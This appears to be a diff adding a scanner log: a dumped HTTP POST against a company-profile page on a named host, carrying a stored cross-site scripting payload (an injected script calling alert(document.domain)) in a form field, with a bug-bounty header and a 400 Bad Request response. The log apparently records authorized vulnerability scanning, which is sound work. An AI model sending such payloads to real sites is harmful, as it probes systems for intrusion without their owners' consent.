@@ -1,0 +1,24 @@
+[royalevent-stored-xss] Dumped HTTP request for https://techsolutions.bitpanda.com/royal_event/companyprofile.php
+
+
+POST /royal_event/companyprofile.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0
+Connection: close
+Content-Length: 151
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=
+[royalevent-stored-xss] Dumped HTTP response https://techsolutions.bitpanda.com/royal_event/companyprofile.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 556fb8386f039ca8ee6a5b3f9ad1828c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: USYjHCdGUNC_DjTbWiKchHXTgp36Y7q3cwajUlFIxmTy4CKS69pPYQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
